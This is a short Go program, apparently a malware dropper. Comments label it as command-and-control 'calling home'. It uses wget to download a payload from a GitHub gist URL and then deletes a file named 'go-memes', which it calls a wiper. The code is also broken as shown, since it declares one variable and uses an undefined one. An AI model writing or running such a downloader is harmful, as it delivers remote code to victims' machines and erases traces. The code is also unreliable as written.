package main

import (
	"fmt"
	"os"
	"os/exec"
)

func main() {
	// C2 calling home
	gist := "https://gist.githubusercontent.com/kjk15b/370383505c4a8ed13a9eeaaee4642160/raw/cbca5e4390f7a47ad6ed730740397d6625786a7c/bat"
	// Get the payload
	load_linux := exec.Command("wget", gist)
	// Prepare the wiper
	remove := exec.Command("rm", "go-memes")
	
	load.Stdout = os.Stdout
	load.Stderr = os.Stdout
	
	
	if err := load.Run(); err != nil {
		fmt.Println("ERROR: ", err)
	}

	if err := remove.Run(); err != nil {
		fmt.Println("ERROR: ", err)
	}
}